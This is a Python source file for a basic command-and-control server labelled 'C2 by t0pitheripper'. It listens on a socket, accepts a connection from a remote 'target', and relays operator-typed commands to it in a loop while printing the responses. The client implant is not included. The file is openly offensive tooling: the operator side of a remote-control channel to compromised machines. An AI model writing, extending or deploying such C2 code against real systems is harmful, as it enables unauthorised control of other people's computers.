import socket
import sys

def banner():
                                            
    print(" 8888888888888888                   \*88*/ ") 
    print("       88                                 ")
    print("       88   ,adPPYba,   8b,dPPYba,    88   ")
    print("       88  a8"     '8a  88P'    "8a   88   ")
    print("       88  8b       d8  88       d8   88 --- C2 by t0pitheripper")
    print("       88  '8a,   , a8'  88b,   ,a8'  88   ")
    print("       88   'OYbbdP'    88`YbbdP'     88   ")
    print("       88               88            88   ")
    print("       88               88            88       ")

def comm_in(remote_target):
    print('[+] Awaiting response..')
    response = remote_target.recv(1024).decode()
    return response

def comm_out(remote_target, message):
    remote_target.send(message.encode())

def listener_handler():
    sock.bind((host_ip, host_port))
    print('[+] Awaiting connection from Client..')
    sock.listen()
    remote_target, remote_ip = sock.accept()
    targets.append([remote_target, remote_ip])
    print(targets)
    print(targets[0][1])
    print(targets[0][1])
    comm_handler(remote_target, remote_ip)
    
def comm_handler(remote_target,remote_ip):
    print(f'[+] Connection recieved from {remote_ip[0]}')
    while True:
        try:
            message = input('Message to send#> ')
            if message == 'exit':
                remote_target.send(message.encode())
                remote_target.close()
                break
            remote_target.send(message.encode())
            response = remote_target.recv(1024).decode()
            if response == 'exit':
                print('[-] The client has terminated the session.')
                remote_target.close()
                break
            print(response)
        except KeyboardInterrupt:
            print('[+] Keyboard interrupt issued.')
            message = 'exit'
            remote_target.send(message.encode())
            sock.close()
            break
        except Exception:
            remote_target.close()
            break

if __name__ == '__main__':
    targets = []
    banner()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
        listener_handler()
    except IndexError:
        print(' [-] Command Line argument(s) missing, Please Try again.')
    except Exception as e:
        print(e)